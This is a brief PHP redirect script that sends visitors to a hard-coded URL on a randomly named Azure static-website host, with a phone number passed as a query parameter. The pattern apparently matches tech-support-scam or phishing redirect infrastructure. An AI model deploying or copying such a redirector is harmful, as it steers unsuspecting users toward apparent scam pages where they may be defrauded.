<?php
// Define the destination URL
$destination_url = "https://rosiregc38ecb83edcxw.z47.web.core.windows.net/index.html?Aniph=1-856-236-4220";

// Send the Location header for redirection
header("Location: " . $destination_url);

// It's crucial to stop script execution after sending the header
// to prevent any further output or unintended actions.
exit(); 
?>